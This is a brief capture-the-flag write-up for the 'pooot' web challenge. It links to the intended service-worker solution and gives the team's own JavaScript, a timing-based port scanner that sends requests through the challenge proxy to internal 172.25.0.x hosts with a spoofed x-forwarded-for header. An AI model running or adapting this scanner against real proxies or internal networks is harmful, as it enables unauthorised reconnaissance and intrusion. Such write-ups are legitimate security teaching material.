The intended solution was to use service workers in order to incercept which requests were being sent. For our solution, NotDeGhost implemented a time based port scanner which found the server and the port we were supposed to find via service workers instead.

Intended sol: https://cdn.discordapp.com/attachments/689364215047127055/711408475284176936/unknown.png
https://gist.github.com/terjanq/cd811311014dc16ef23d680c0ea89562

https://medium.com/bugbountywriteup/pooot-writeup-217384a6b69c

```javascript
var sus = []

testPort = (base, port=6379) => {
const start = Date.now()

return fetch("https://pooot.challenges.ooo/172.25.0." + base + ":" + port, {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9",
    "x-forwarded-for": "172.25.0.11",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrerPolicy": "no-referrer-when-downgrade",
  "body": null,
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
}).then(a => a.text())
.then(a => {
if(Date.now() - start < 1000) sus.push(base)
if(a !== "Could not reach this domain") alert(base + ":" + port)

console.log(base + ":" + port + " > " + a + " | " + (Date.now() - start))
})
}

b = [101, 102, 103, 105, 110, 111, 112, 113, 114];
(async () => {
for(var i = 0; i < b.length; i++){
for(var port = 1; port < 10000; port++){
await testPort(b[i], port)
}
}
})()
```
